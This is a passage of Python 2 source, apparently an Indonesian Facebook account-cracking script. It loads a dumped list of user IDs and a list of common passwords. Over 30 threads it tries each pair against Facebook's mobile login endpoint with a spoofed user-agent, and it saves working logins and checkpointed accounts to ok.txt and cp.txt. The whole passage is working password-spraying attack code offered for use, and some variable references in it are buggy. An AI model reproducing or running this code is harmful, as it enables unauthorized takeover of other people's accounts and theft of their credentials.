				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
				
		loop += 1
                print "\r\x1b[1;37m [%s/%s][OK/CP:%s\%s]"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def man():
        global pw,loop
        try:
                idt = raw_input(" [*] file dump : ")
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit(" [!] file does not exist")
        print ("\n [*] example \x1b[1;32m[ \x1b[1;33msayang,doraemon,rahasia \x1b[1;32m]\x1b[1;37m")
        pw = raw_input(" [?] password : ").split(",")
        if len(pw) ==0:
                exit(" [!] can not be empty")
        print "\n [+] OK results saved to : ok.txt\n [-] CP results saved to : cp.txt\n"
        print " [!] press ctrl + z to pause the process\n"
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
	global loop,pw
	try:
		
		for i in pw:
			rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': user, 'pass': i, 'login': 'submit'}, headers={'user-agent': 'Mozilla/5.0 (Linux; U; Android 2.2) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'})
			xo = rex.content
			if 'mbasic_logout_button' in xo or 'save-device' in xo:
				print '\r\x1b[1;32m  * --> ' +user+ '|' +i+ ''
				Successful.append(user+' | '+password)
				save = open('ok.txt','a')
				save.write(str(user)+' | '+str(password)+'\n')
				save.close()
				break
			elif 'checkpoint' in xo:
				print '\r\x1b[1;33m  * --> ' +user+ '|' +i+ ''
				Checkpoint.append(user+' | '+i)
				save = open('cp.txt','a')
				save.write(str(user)+' | '+str(i)+'\n')
				save.close()
				break
				
		loop += 1
                print "\r\x1b[1;37m [*] crack: %s/%s - ok-:%s - cp-:%s"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def results(Successful,Checkpoint):
        if len(Successful) !=0:
                print ("\n\n [\033[1;37m*\033[0m] \033[37mOK : "+str(len(Successful)))
        if len(Checkpoint) !=0:
                print ("\n\n [\033[1;33m#\033[0m] \033[33mCP : "+str(len(Checkpoint)))
        if len(Successful) ==0 and len(Checkpoint) ==0:
                print "\n"
                print (" [\033[1;31m#\033[0m] you got no results")


if __name__ == '__main__':
	hapus()
	license()

# cie ga bisa ngoding 
